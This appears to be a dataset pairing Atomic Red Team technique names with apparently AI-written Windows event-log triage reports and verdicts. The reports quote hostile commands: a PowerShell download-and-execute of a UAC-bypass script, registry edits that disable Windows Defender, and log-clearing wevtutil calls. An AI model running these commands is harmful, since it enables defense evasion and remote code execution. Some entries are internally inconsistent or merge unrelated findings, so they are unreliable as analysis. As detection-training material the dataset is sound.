Disable Windows Prefetch Through Registry,"After carefully analyzing the provided Windows event logs, several observations and notable events can be categorized as potentially suspicious or indicative of misconfiguration:

1. **Log Clearing Activity**:
   - System and Security logs indicate Event ID 104 from Provider ""Microsoft-Windows-Eventlog"" showing that logs have been cleared. The ""LogFileCleared"" events list the user ""admin_test"" performing these actions on the ""System"" and ""Windows PowerShell"" channels. This also corresponds with Event ID 1102 from the Security log indicating the Security log was cleared by the same user.
   - The use of `wevtutil.exe cl` commands in quick succession as seen in the Sysmon log correlates with the log clearing events. This is an indicative behavior of log tampering which is often associated with attempts to cover tracks following unauthorized or malicious activities.

2. **Suspicious Command Line Activity**:
   - A registry modification command was executed via `cmd.exe` to alter the ""EnablePrefetcher"" setting using `reg.exe`, which is unusual without a clear legitimate administrative task or documented change request.

3. **Privileged User Actions**:
   - The user ""admin_test"" is seen running commands that require administrative privileges. These include clearing event logs and modifying registry keys at a high integrity level. If this activity wasn't authorized or expected for maintenance, it could indicate privilege misuse.

4. **Use of High Integrity Level Commands**: 
   - Commands being executed at a high integrity level by ""admin_test"" increase the risk if these actions are not within the regular scope of duties or authorized administrative tasks.

### Assessment and Guidance:
- **Assessment**: The combination of cleared logs, especially across multiple important log channels, and the registry modification is suspicious. While these actions could potentially be legitimate if documented as part of a system maintenance task, the lack of such documentation makes them more likely to be attempts at obfuscation and unauthorized system modifications.

- **Resolution**: **SUSPICIOUS** - The activities recorded in the logs are unusual and warrant further investigation to confirm their legitimacy. The user ""admin_test"" should be questioned regarding these activities, and any authorized administrative tasks should be reviewed and cross-referenced with existing change management records.

### Recommended Actions:
1. Verify if the ""admin_test"" account actions correlate with authorized tasks or change control tickets during the timestamp of these events.
2. Check for any recent security incidents or alerts that coincide with these events.
3. Review access controls and privileges for ""admin_test"" to ensure they are appropriately restricted.
4. Monitor any further activity from the ""admin_test"" account to prevent unauthorized actions.
5. Consider restoring the prefetch settings if these changes were not approved or are inconsistent with standard configurations."
Rundll32 syssetup.dll Execution,"### Detailed Analysis of the Provided Windows Event Logs

#### **Key Observations:**

1. **Event Log Clearing Activity:**
   - In both the Security and System logs, there are multiple instances (Event ID: 1102 in the Security log and Event ID: 104 in the System log) where logs have been cleared by the user ""admin_test"". This activity is concerning as it can be indicative of a user attempting to cover their tracks after unauthorized or malicious activities.

2. **Execution of `wevtutil` for Log Clearing:**
   - The Sysmon logs show several entries where the application `wevtutil.exe` is used to clear logs. The `wevtutil` command-line utility is known for managing and clearing event logs, and its use for log clearing, especially without legitimate administrative justification, can be suspicious.

3. **Command Line Usage Patterns:**
   - The Sysmon log entry with Process ID 848 for `cmd.exe` shows an unusual command line operation attempting to execute a .inf file using `rundll32.exe` from a temporary directory involving the Atomic Red Team (a known security testing toolset). This is typically associated with tactics, techniques, and procedures (TTPs) used to simulate or carry out attacks for testing purposes.

4. **Parent and Child Processes:**
   - The parent processes of `wevtutil.exe` are instances of `wsmprovhost.exe`, which appear to be associated with remote management. The `wsmprovhost` process starting `wevtutil.exe` without a clear legitimate context can indicate an anomaly or malicious intent.

5. **Process and Execution Patterns:**
   - There is a recurring pattern whereby `conhost.exe` accompanies other processes. While this process by itself is a legitimate part of the Windows OS, the frequency and context in how it is spawned (by processes like `wevtutil` and `rundll32`) could demand further scrutiny.

6. **Presence of Security Awareness Tools:**
   - The presence and use of Atomic Red Team tools in the System suggest possible security exercises or awareness training, indicating a need to identify whether this was planned or permitted by the administrative policy.

#### **Assessment of the Situation:**

The combination of cleared logs, suspicious usage of `wevtutil`, and Atomic Red Team artifact usage strongly suggests that the activities captured in these logs are not benign. They exhibit patterns and commands typical of techniques used for malicious purposes, such as clearing traces and potentially exploiting the system. These findings warrant a deeper investigation.

#### **Threats or Risks Identified:**

- **Log Manipulation:** The clearing of event logs can indicate an attempt to destroy forensic evidence of unauthorized activities.
- **Potential Exploitation:** The execution of scripts and lack of contextual information about the use of security testing tools might imply unauthorized testing or exploitation attempts.
- **Privilege Escalation or Evasion Tactics:** The integrity level and the execution of commands that interact with system components suggest potential privilege escalation activities.

#### **Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Confirm with relevant stakeholders or the IT team if there were authorized security assessments being conducted using Atomic Red Team tools during this period.
   - Review all administrative and user accounts, especially ""admin_test"", for unauthorized access and activities.
   - Implement enhanced monitoring of event logs, with particular attention to `wevtutil` usage and clearing activities.

2. **Forensic Investigation:**
   - Conduct a thorough investigation of the host and its file system, focusing on executable files and recent changes to the system.
   - Retrieve and analyze network traffic logs during the timeframe of suspicious activities to identify potential external communications or exfiltration attempts.

3. **Security Hardening:**
   - Ensure that appropriate logging and monitoring measures are enforced, with mechanisms to alert on attempts to clear logs.
   - Review and tighten permissions and access rights on critical system utilities like `wevtutil.exe` and consider logging alterations to key system files.
  
### **Final Resolution: SUSPICIOUS**
Based on the evidence and activities observed in the logs, the resolution is ""SUSPICIOUS"". The actions suggest potential malicious behavior that warrants in-depth investigation and verification of the legitimacy of the activities performed."
Modify UseTPMKeyPIN Registry entry,"### Detailed Analysis

#### **Suspicious or Anomalous Behavior**

1. **Event Log Clearing:** 
   - The logs contain multiple entries indicating the clearing of different event logs (Security, System, and Windows PowerShell) by the user `admin_test`. This is done using the command `wevtutil.exe cl`, which is a legitimate utility typically used for managing event logs, but its usage can be suspicious when logs are cleared without valid reasons, especially by user accounts with administrative privileges. The specific log entry is associated with Event ID 1102 in the Security log and Event ID 104 in the System log.

2. **Time Manipulation:**
   - The logs display multiple Event ID 4616 entries showing inconsistent timestamp sequences on `Server002`. The system time appears to have been modified by `svchost.exe`. While certain services might adjust system time based on various factors, it is uncommon for multiple rapid corrections, and it can potentially indicate tampering to cover tracks.

3. **Registry Modification via Command Line:**
   - The execution of `cmd.exe` with command-line arguments to modify the registry (setting entry `UseTPMKeyPIN` with a value indicating potential TPM behavior changes) suggests actions that alter security settings, which may be indicative of privilege escalation or preparation for malicious activities. The presence of both `cmd.exe` and `reg.exe` entries supports this finding.

4. **Console Window Host (conhost.exe) and Event Log Command Execution:**
   - Regular spawning of `conhost.exe` processes associated with the event log clearing commands (parents being `wevtutil.exe`) highlights possibly scripted or automated tasks to manipulate event logging visibility.

5. **Under-the-Hood Administrative Actions:**
   - Actions executed by Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are visible, but given their expected updates functionality, require context verification. Nonetheless, these processes occur amidst registry modifications and log alterations, necessitating scrutiny.

#### **Malicious Activity or Compromise Indicators**

- The combination of cleared logs, time modifications, and direct registry edits suggest deliberate obfuscation and system modification potentially associated with intrusion activities. While each action taken individually might be explainable within routine administrative tasks or software updates, their convergence and timing provide strong indicators of compromise.

### Assessment

Based on the provided event logs, there is a notable presence of actions that align with attempts to cover tracks or modify security configurations in potentially harmful ways. 

### Resolution

Given the deliberate nature of these actions, the circumstantial alignment with potential malicious objectives, and the absence of benign explanations typically associated with these activities over such a short span of time:

- **Resolution:** **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response Actions:**
   - Isolate the affected system (Server002) from the network to prevent further data exfiltration or lateral movement.
   - Initiate a comprehensive forensic analysis on Server002, including deep dive into possible file changes, use of unauthorized scripts, and potential backdoors.
   - Review user activities and credentials for `admin_test` to ensure they weren’t compromised.

2. **Long-Term Measures:**
   - Enhance monitoring around similar administrative actions and privilege escalation attempts on other networked systems.
   - Conduct a thorough review and upbringing of incident response plans and staff training on recognizing early indicators of compromises.
   - Implement stricter change control policies and regular auditing, especially for sensitive accounts and utilities typically associated with administrative tasks."
MSBuild Bypass Using Inline Tasks (VB),"From the logs provided, I observed the following potential indicators of suspicious or anomalous behavior:

### Key Indicators from Logs:
1. **Log Clearing Activity**:
   - There are multiple instances of the event logs being cleared:
     - System log EventID 104: `admin_test` cleared both the `System` and `Windows PowerShell` event logs.
     - Security log EventID 1102: `admin_test` cleared the Security log.
     - This behavior is often associated with attempts to cover tracks for potentially malicious activities. Clearing event logs without a valid reason is a red flag.

2. **Usage of `wevtutil.exe`**:
   - Multiple executions of `wevtutil.exe` to clear various logs (System, Application, Security, Windows PowerShell). The command-line arguments show it was used explicitly to clear logs, confirming suspicious intent.

3. **Suspicious Command Execution**:
   - The execution of `cmd.exe` with command arguments leading to `msbuild.exe` and `vbc.exe` using paths in the `Temp` directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1127.001\\src\\vb.xml`). This can suggest usage related to execution of local build scripts, a method sometimes used in attacks to execute unauthorized code. The reference to `AtomicRedTeam`, a known red team engagement framework, suggests a simulation of an attack technique.

4. **Process Execution under High Integrity Level**:
   - Processes like `wevtutil`, `cmd.exe`, `msbuild.exe` were executed at a high integrity level, enabling them to perform actions with elevated privileges.

5. **Presence of Testing or Simulation Frameworks**:
   - The mention of `AtomicRedTeam` indicates usage of known testing tools for simulating attack techniques. While potentially benign in context of red teaming exercises, without clear authorization, it presents a risk.

### Conclusion:
- **Resolution: MALICIOUS**: 
  - The coordinated clearing of event logs by `admin_test`, combined with the execution patterns associated with known attack simulations (`AtomicRedTeam`), and suspicious command sequences executed at a high integrity level strongly indicate malicious behavior reminiscent of a red team exercise or potentially unauthorized investigation methods. If this activity was not pre-approved as part of a security test or exercise, it would indeed be considered malicious.

### Guidance:
1. **Immediate Actions**:
   - Validate with your teams if there was a pre-approved red team exercise scheduled around the time these logs were generated.
   - Lock or temporarily suspend the account `admin_test` and analyze its recent activities in greater detail.
   - Evaluate and investigate any other systems accessed by `admin_test` for similar patterns of suspicious activity.

2. **Recommendations**:
   - Implement alerts for log clearing activities to prompt timely investigation.
   - Enforce stricter monitoring and auditing of privileged accounts.
   - Ensure clear communication and documentation of security exercises to avoid confusion with actual incidents."
Disable Windows Shutdown Button,"Upon reviewing the logs, several suspicious activities stand out, indicating possible malicious behavior:

1. **Clearing of Event Logs**:
   - The `admin_test` user has cleared multiple logs, including Security, System, and Windows PowerShell logs around the same timestamp `2024-10-24 14:59:49`. This is observable through Event IDs `1102` (Security log cleared) and `104` (System and Windows PowerShell logs cleared). Clearing event logs is a common technique used by attackers to cover their tracks.

2. **Use of High Privilege Account**:
   - The `admin_test` account held several high privileges as noted in Event ID `4672`. The account had privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege`. Usage of these privileges without clear explanation could indicate preparation for malicious actions or privilege escalation.

3. **Suspicious Command Execution**:
   - There is a notable execution of `cmd.exe` with suspicious command-line arguments: `""cmd.exe"" /c reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f`. This indicates a registry modification designed to change system policies related to logon, which could signify malicious intent.

4. **Use of `wevtutil.exe`**:
   - Repeated use of `wevtutil.exe` to clear logs via different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""`) as observed in different Sysmon logs. This further supports the attempt to hide activities.

Given these observations, the activities in the log are highly concerning and fit a pattern consistent with malicious behavior by potentially a malicious insider or an external actor who gained access to privileged accounts. Log clearance, registry manipulation, and high privilege usage combine into a strong suspicion that the activities were not benign or accidental.

**Resolution: MALICIOUS**

**Guidance**:
- Immediately investigate the `admin_test` account for unauthorized usage and change credentials if necessary.
- Conduct a thorough review of the system for other potential signs of compromise, such as malware or further log alterations.
- Restore and review backups if logs or data have been modified beyond repair.
- Monitor the network for similar activities across other systems to check if this is a broader incident.
- Report the incident to relevant authorities if it fits an intrusion or breach according to corporate policies."
Enable Proxy Settings,"Upon reviewing the provided event logs, several indicators of potentially suspicious or malicious activity are observed:

1. **Log File Clearance**: 
   - The event logs indicate the use of `wevtutil.exe` to clear logs (`cl` command) across multiple channels including `Sysmon/Operational`, `System`, and `Security` at the same timestamp `2024-10-24 18:04:05`. 
   - This behavior is associated with attempts to cover tracks and is a significant indicator of potentially malicious activity.

2. **Execution of **cmd.exe** with Registry Changes**:
   - The logs show `cmd.exe` executing a command to add or modify registry settings related to internet proxy configuration:
     ```
     CommandLine"": ""\""cmd.exe\"" /c reg add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"" /v ProxyEnable /t REG_DWORD /d 1 /f""
     ```
   - This type of registry modification can be used for malicious purposes like redirecting network traffic through an attacker-controlled proxy.

3. **High Privilege Process Execution**:
   - Multiple processes are executed under a high integrity level, indicating they are running with elevated privileges. This includes the `cmd.exe` process mentioned earlier, and subsequent processes such as `wevtutil.exe` and `whoami.exe`.
   - The use of elevated privileges to execute commands that modify operating system behavior or configurations is a red flag for potential compromise.

4. **Time Change Events**:
   - Although time changes (event ID 4616) can be legitimate, they occurred around the time of log clearance and registry modification activities, indicating potential manipulation attempts to obscure activity timelines.

Based on the observed activities, especially the targeted log clearance and registry modifications executed with high privileges, the situation indicates a coordinated attempt to manipulate system configurations and cover malicious activity. Immediate attention and a deeper investigation into these events and system behaviors are necessary to determine the full impact and origin of these actions.

Resolution: **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Isolation**: Consider isolating the affected host (Server002) to prevent further potential damage or lateral movement within the network.
- **Forensic Analysis**: Conduct a thorough forensic analysis, including memory, disk, and network analysis, to identify the source of compromise and any associated malicious payloads.

- **Implement Monitoring**: Enhance monitoring for similar activities across other systems, focusing on log clearance, registry modifications, and unauthorized command executions.
- **Remediation and Recovery**: Once the threat is fully understood, implement necessary remediation steps to remove malicious components and securely restore operations."
WinPwn - UAC Magic,"Upon reviewing the log entries provided, I have identified several indicators that suggest malicious activity:

1. **PowerShell Activities:**
   - The PowerShell log entries show that a script is being downloaded and executed from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). This script execution involves a `UACBypass`, which points to privilege escalation attempts. The use of `iex(new-object net.webclient).downloadstring(...)` is a common technique used by attackers to download and immediately execute scripts in memory, avoiding writing them to disk, which helps in evading detection.
   
2. **Event Log Clearing:**
   - Windows Event Logs have been cleared, as indicated by `Security` Event ID 1102 and `System` Event ID 104. This typically suggests an attempt to cover tracks following potentially malicious activities.
   - Exhibited in Sysmon with process executions of `wevtutil.exe` clearing logs: 
     - Security log cleared with `wevtutil.exe cl Security`.
     - System log cleared with `wevtutil.exe cl System`.
     - Application log cleared with `wevtutil.exe cl Application`.
   
3. **Privileged Accounts and Privileges:**
   - Security events show the usage and granting of multiple high-level privileges to the user `admin_test`. This includes important privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which could facilitate a system compromise.

4. **Time Manipulation:**
   - The logs show manipulation of the system time, although the exact reason isn’t clear, it might be used for anti-forensics or evading detection processes. Security Event ID 4616 and System Event ID 1 show time changes executed through the process `svchost.exe`.

5. **Suspicious User Account:**
   - Activities are carried out under a singular user account `admin_test` shortly followed by log cleaning. This user account might be compromised or malicious in itself.

Based on the analysis of the activities:

- The behavior of downloading and executing scripts from external URLs with PowerShell, attempts to bypass UAC, and comprehensive log clearing are strong indicators of compromise.
- The manipulation of system time, escalation of privileges, and specific admin account usage for potentially malicious purposes strengthen the assessment of malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host (`Server002`) from the network to prevent further malicious activities and lateral movement.
- Conduct a deeper forensic analysis, considering retrieving and analyzing memory/malware artifacts, and check for further indicators of compromise across other systems.
- Reset credentials related to the account `admin_test` and investigate it for possible misuse.
- Reinforce the monitoring on PowerShell activities and disable script executions that download from the internet.
- Review and implement enhanced security measures, such as ensuring robust UAC policies, and consider more restrictive access control measures."
Delete TeamViewer Log Files,"Upon reviewing the log entries across the Windows PowerShell, System, Security, Application, and Sysmon logs, we can observe the following indicators that require attention:

### Observations:

1. **PowerShell Execution:**
   - There are multiple PowerShell logs related to creating and removing a temporary log file (`TeamViewer_54.log`) via PowerShell. Although executing PowerShell scripts to create and delete temporary files could be routine, such activity can also be used by attackers to hide traces of malicious actions.

2. **Log Clearing:**
   - Events indicate log file clearing activities. Specifically, the Security, System, and Windows PowerShell event logs were cleared by the user ""admin_test."" Clearing logs can often be a sign of an attempt to cover tracks following unauthorized activities.

3. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` tool is observed being used to clear the logs (`cl` command) across different channels (Microsoft-Windows-Sysmon/Operational, System, Application, and Windows PowerShell). This repetition indicates an attempt to suppress log entries that might have recorded suspicious actions.

4. **Unusual Time Changes:**
   - The system time was adjusted by the `svchost.exe` process as logged in the System and Security logs. Time changes can be used to confuse log timelines, making investigation harder.

5. **Sysmon Logs:**
   - Sysmon logs capture `whoami.exe` and other standard system tools executed by the user ""admin_test"". While these activities could be legitimate administrative tasks, when combined with the other suspicious activities, they warrant further investigation.

6. **Edge Update Processes:**
   - Though numerous entries pertain to Microsoft Edge Update and associated processes, these appear to be legitimate updates initiated by the system, as they have common patterns seen with software updates managed by intune or other management systems.

### Assessment:

Given the detailed analysis of the provided logs:

1. **Log Clearing Events:** 
   - The intentional clearing of logs by ""admin_test"" suggests potential malicious activity. Clearing of logs is a strong indicator of privilege misuse or attempt at tampering.

2. **PowerShell Activity:**
   - The repetitive PowerShell execution that manipulates temporary files looks unusual, primarily when accompanied by log clearing, suggesting potential attempts at cover-up or as part of automated scripts executing malicious payloads.

3. **Time Change:**
   - Time changes by svchost are uncommon and, in this context, could be used to help align with or mask malicious activities.

### Resolution:

- **RESOLUTION: MALICIOUS**

The combination of systematic log clearing using `wevtutil.exe`, suspicious PowerShell activity, and manual time adjustments are highly indicative of attempts at cover-up after unauthorized access or malicious actions.

Tamper with Windows Defender Registry - Powershell,"### Detailed Analysis

The provided event logs offer a sequence of events occurring on the Windows host ""Server002."" Upon thorough investigation, some activities appear suspicious and potentially indicative of malicious behavior:

1. **PowerShell Activity**:
   - The PowerShell logs indicate a series of commands intended to disable various security features of Windows Defender. It includes disabling real-time protection, behavior monitoring, intrusion prevention, and tamper protection. This is highly suspicious activity consistent with attempts to disable system defenses to facilitate unauthorized actions.
   - Command executing these changes is seen: `Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1...` among others. 

2. **Event Clearing**:
   - The System and Security logs contain events (Event ID 104 and Event ID 1102, respectively) indicating that the logs have been cleared. The clearing of event logs without a legitimate reason or proper oversight is suspicious, as it is often used to cover tracks post-compromise.
   - The actions were performed by the user `admin_test`, suggesting potential misuse of legitimate privileges.

3. **Sysmon Logs**:
   - Series of `wevtutil.exe` commands appear in the Sysmon logs for clearing logs: `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, `cl Application`, and `cl Microsoft-Windows-Sysmon/Operational`, likely linked to event clearing actions described above.
   - Significant PowerShell activity observed again from `powershell.exe` that executes harmful scripts affecting Windows Defender, aligning with activity in the PowerShell logs.

2. **Process Execution:**
   - The logs show execution of several processes, including `PowerShell`, `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and usage of `plink.exe`. 
   - **PowerShell:** The simple execution of PowerShell in itself is normal on a Windows system. However, in conjunction with other events, it should be considered.
   - **wevtutil.exe:** This utility is often used to manage and clear event logs, which aligns with the log clearance activities observed.
   - **whoami.exe:** Often used for gathering current user information, it can be benign but also seen in post-exploitation activities.
   - **cmd.exe:** Command execution involving `plink.exe` points towards a potential use of external tools for remote connectivity, specifically SSH via `plink.exe`, which is part of the PuTTY suite. The use of an SSH tool to connect to a remote server (`atomic.local` with user `root`) is highly suspicious and indicative of a potential post-exploitation activity.
   - **External Tools:** The presence of `plink.exe` running commands related to ESXi firewall modifications raises red flags about unauthorized network configurations.

3. **User Account and Privileges:**
   - The `admin_test` account has executed activities that cleared logs and ran commands with potentially high integrity levels.
   - The logon ID and integrity levels suggest privileged operations, which may indicate misuse of elevated permissions by a legitimate user or compromise of an administrative account.

4. **Integration with Known Malicious Tools:**
   - The directory `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\...` suggests potential integration with Atomic Red Team testing tools. While these tools can be used for legitimate testing and security assessments, in the wrong hands, they can facilitate attacks, including privilege escalation and defense evasion.

### Conclusion
The presence of multiple suspicious activities—log clearances, the use of `wevtutil.exe` potentially to clear logs, execution of `plink.exe` for SSH connectivity, and modification commands for ESXi firewalls—suggests a potential insider threat or system compromise. This activity is not typical for routine administrative tasks and needs a closer examination of who accessed these logs and ran these commands.

**Resolution: MALICIOUS**

### Guidance
1. **Immediate Actions:**
   - Isolate the suspected system (Server002) from the network to prevent further potential malicious interactions.
   - Conduct a full forensic investigation on `Server002` to determine the root cause and scope of the compromise.
   - Review user activity and access logs to identify potential unauthorized access.

2. **Further Actions:**
   - Audit and potentially reset credentials for the `admin_test` account and investigate any unauthorized use.
   - Implement stricter access controls and monitoring for administrative tools and elevated privilege accounts.
   - Consider deploying intrusion detection and prevention systems to alert and block similar activities in the future.

3. **Recommendations:**
   - Ensure security patches and system updates are routinely applied.
   - Conduct regular security awareness training highlighting the risks of malicious tools masquerading as legitimate software."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"After analyzing the provided logs, the following observations and analysis have been made:

1. **Security Log Events**:
   - **Event ID 1102**: The security log file was cleared by the account `admin_test`. This action can indicate an attempt to cover tracks by a user with potentially malicious intent, especially without prior legitimate justification.

2. **Sysmon Log Events**:
   - Multiple **Event ID 1 and 5** log entries show the execution of `wevtutil.exe` with the `cl` (clear) command on various logs, including System, Security, Application, and Windows PowerShell. The execution is performed by the same user `SERVER002\\admin_test`.
   - The use of `wevtutil.exe` to clear logs is a known technique to cover up malicious activities.
   - A command involving `cmd.exe` executing `msiexec.exe` from a temporary path (`AtomicRedTeam` folder) indicates a potential testing or simulation of attack techniques using Atomic Red Team tools, which often focus on testing security detection capabilities. While Atomic Red Team is legitimate, in a production environment, such use can be indicative of suspicious or unauthorized testing unless previously sanctioned.

3. **System Log Events**:
   - **Event ID 104**: Various logs are shown as cleared by the same user `admin_test`, further supporting attempts to conceal activity.

4. **Application Log Events**:
   - Activities tied to MSI installations under Atomic Red Team highlight potentially unauthorized testing or an operator simulating an attack that could be testing a defensive capability of the environment.

**Assessment**:
- The presence of the LogFileCleared event (ID 1102) indicates potential attempts to erase evidence on the system.
- The execution of `wevtutil.exe` for clearing logs such as Security, Application, and System by an administrative account (`admin_test`) is highly indicative of an attempt to hide illicit actions since such behavior is typical in scenarios where users attempt to cover their tracks post-compromise.
- The usage of Atomic Red Team scripts or scenarios indicates that either security testing is being conducted without explicit notification/approval, or someone is simulating attack techniques.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Investigate and confirm if the use of Atomic Red Team was authorized. Check if there were any security assessments or testing planned that would result in such logs.
   - Review access controls and audit trails for the `admin_test` account. If compromised, reset credentials immediately.
   - Review network logs around the time of these events for any unauthorized access or data exfiltration attempts.
  
2. **Long-term Recommendations**:
   - Implement stricter logging and monitoring around administrative activities, specifically actions like log clearance.
   - Conduct a thorough incident response to assess the scope of potential compromise, engaging with a security forensic team if necessary.
   - Enhance security awareness training to ensure all administrative actions, especially involving security testing or assessments, are logged and communicated appropriately. 

These steps aim to address immediate security concerns while strengthening overall system safeguards to prevent future incidents."
Azure - Eventhub Deletion,"Based on the analysis of the provided logs, there is significant evidence pointing towards suspicious activity, potentially indicating unauthorized or malicious behavior. Here's the breakdown of the logs:

### PowerShell Logs
- **PowerShell Execution:** The logs show a PowerShell script executing commands to connect to Azure AD and remove an Azure Event Hub. The use of `ConvertTo-SecureString` with plaintext passwords is a poor security practice and often associated with malicious activities aimed at gaining unauthorized access.

### Sysmon Logs
- **Clear Logs:** Multiple instances of `wevtutil.exe` being used to clear logs (Application, System, Windows PowerShell, Security) by the user ""admin_test."" Such actions are indicative of an attempt to cover tracks after suspicious or malicious activity.
- **Suspicious PowerShell Activity:** The execution of a PowerShell script to remove Azure resources without any defined parameters (""-ResourceGroupName -Namespace -Name test_eventhub"") suggests possible data deletion activities or unauthorized configuration changes which could lead to data loss or service disruption.

### System and Security Logs
- **Log Clearing:** Logs for System and Windows PowerShell channels were cleared, which is typically an attempt to hide traces of potentially malicious activities.
- **Security Log Clearing:** Clearing of the Security log was also noted, which is highly indicative of malicious activity as it prevents auditing security events.

### Observations
- **Tool Usage:** `SearchProtocolHost.exe` and other service executables observed are likely benign background operations. However, their occurrence alongside the event-log-clearing activities triggers suspicion.
- **Edge Updates:** There are numerous Microsoft Edge updates which appear to fit normal behavior, except when considered as potentially hiding other activities through noise.

### Conclusion
The user ""admin_test"" on ""Server002"" executed a PowerShell script that performs Azure AD connections and Azure Event Hub deletions, while also employing `wevtutil.exe` multiple times to clear essential logs like System, Application, PowerShell, and Security. This profile of activity strongly suggests **attempts to conceal potentially unauthorized activity** related to Azure management. The use of plaintext passwords in script and log clearing activity are primary indicators of the suspiciousness of these events.

### Recommended Action
1. **Immediate Investigation:** Conduct a thorough investigation into the ""admin_test"" user’s activities for unauthorized access patterns or anomalies.
2. **Azure Audit and Alerting:** Enable Azure activity logging and alerting to monitor for unauthorized resource deletions or changes.
3. **Security Hardening:** Review and tighten PowerShell execution policies and credential storage procedures.
4. **Forensic Capture:** Preserve all available data and considering isolating the server for in-depth forensic analysis.

**Resolution: SUSPICIOUS** - The activity requires further investigation due to the nature of the events and associated potential unauthorized actions."
MSBuild Bypass Using Inline Tasks (C#),"Upon reviewing the provided logs, some activities indicate suspicious behavior that warrants further investigation. Here’s a breakdown of the findings:

### Key Findings:
1. **Event Log Clearing:**
   - In the security log, Event ID 1102 indicates that the event logs were cleared by ""admin_test"". This typically signifies an attempt to cover tracks, a common tactic following unauthorized access or malicious activity.
   - In the system log, Event ID 104 shows that the logs for the ""System"", ""Security"", and ""Windows PowerShell"" channels were cleared by the same user ""admin_test"".

2. **Use of 'wevtutil.exe':**
   - There are multiple Sysmon entries showing the use of `wevtutil.exe` by ""admin_test"" to clear different event logs (e.g., Sysmon, Application, Security). This sequence further supports attempts at covering tracks.
  
3. **PowerShell Activity:**
   - Despite the absence of detailed PowerShell logs here, it is notable that PowerShell was invoked (""WindowsPowerShell\\v1.0\\powershell.exe"") by ""admin_test"" shortly before the logs were cleared. This raises concerns about potentially executed harmful scripts that would not be logged due to the clearing actions.

4. **Microsoft Edge Update Activities:**
   - There are multiple entries related to `MicrosoftEdgeUpdate.exe` processes. While these entries mostly reflect benign activities related to software updates, the timings of these updates, along with other suspicious activities, should be verified to ensure they coincide with real scheduled updates.
   
5. **Compilation through MSBuild:**
   - Entries reflect the execution of `MSBuild.exe` and subsequent compilation activities with potential C# project files. Given that MSBuild can be used to execute scripts and binaries, there is potential that this was used as part of a suspicious or malicious task, especially since these activities are logged under ""AtomicRedTeam"", a known adversarial simulation tool.

6. **Miscellaneous Executions:**
   - The execution of `whoami.exe` and `hostname.exe` might be benign in isolation. However, these usually form part of a sequence of actions by adversaries attempting to understand their execution context on a compromised system.

### Assessment:
The sequence of events — particularly the clearing of logs by ""admin_test"", followed by the use of PowerShell, `wevtutil.exe`, and MSBuild — suggests an attempt to recover control of the system or perform undetected actions. The usage of adversarial simulation tools (e.g., AtomicRedTeam) supports the hypothesis of a potential red teaming exercise or a real compromise.

### Resolution:
- **SUSPICIOUS** - These logs denote activities that are suspicious and suggest potential malicious behavior, particularly due to attempts to erase audit trails (log clearing) and unauthorized execution patterns. Further investigation is needed to confirm the legitimacy or malicious intent of the actions.

### Guidance:
1. Conduct a thorough forensic investigation to verify if these actions were legitimate, part of an internal exercise, or unauthorized.
2. Validate and cross-reference the timelines and activities with network logs, IDS/IPS systems, and endpoint protection alerts.
3. Assess user ""admin_test"" activities, permissions, and recent access history.
4. If the findings point to unauthorized access, initiate incident response procedures accordingly.

By executing these recommendations you can further clarify the situation, potentially identifying the scope and intent of the suspected activities."
Create ADS PowerShell,"Upon reviewing the provided Windows event logs, I identified several points that warrant further attention:

### 1. Event Log Clearance
In both the System and Security logs, there are entries indicating that event logs were cleared:
- **System Log (Event ID: 104):** The logs were cleared by the user ""admin_test"".
- **Security Log (Event ID: 1102):** Cleared by ""admin_test"" as well. 

Clearing event logs is generally suspicious unless there is an administrative justification for this action, as it could be an attempt to cover up other unauthorized or malicious activities.

### 2. PowerShell Activity
The Windows PowerShell log shows unusual PowerShell commands associated with accessing alternate data streams (ADS):
- The command `{echo ""test"" > $env:TEMP\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value ""test""}` suggests the creation or manipulation of alternate data streams. This technique can be used by attackers to hide data or scripts on the file system without easily being detected.

### 3. Sysmon Log Activity
- There is multiple usage of the `wevtutil.exe` tool, which is used to clear event logs, indicating a correlation with the System and Security log clearance events.
- High integrity level processes are seen running `wevtutil.exe`, which is used for log management but could also indicate tampering with logs.

### 4. Elevated Privileges and SYSTEM Logon
- There are Logon and Privilege Assignment events for the SYSTEM user (Event IDs: 4624, 4672). While it is expected for many SYSTEM level tasks to run, the context of log clearance and PowerShell activity makes it worth investigating further.

### 5. Software Updates
- Multiple events related to Microsoft Edge Update processes are observed. While updating procedures are common, the timing in conjunction with logs being cleared and PowerShell activities may suggest the need for verification that these updates were legitimate and expected.

### Assessment:
Based on the analysis of the logs, there are several indicators of potentially malicious activities:
- Event log clearance is suspicious and commonly associated with attempts to cover tracks.
- Unusual and potentially obfuscated PowerShell activity related to alternate data streams could indicate suspicious actions.

### Resolution:
- **SUSPICIOUS**: The activities in the logs, especially log clearance and the usage of PowerShell for accessing alternate data streams, suggest the potential for malicious intent. Further investigation is necessary to determine the legitimacy of these actions, verify proper authorization, and ensure that no unauthorized or malicious actions took place.

### Guidance on How to Proceed:
1. **Investigate Log Clearance:**
   - Confirm if ""admin_test"" had legitimate reasons to clear the logs. 
   - Review the organization's policy on log management and whether such actions conform to it.

2. **PowerShell Script Analysis:**
   - Examine the context and execution of the PowerShell commands, particularly those dealing with alternate data streams. 
   - Validate if this script is part of internal operations or a potential anomaly.

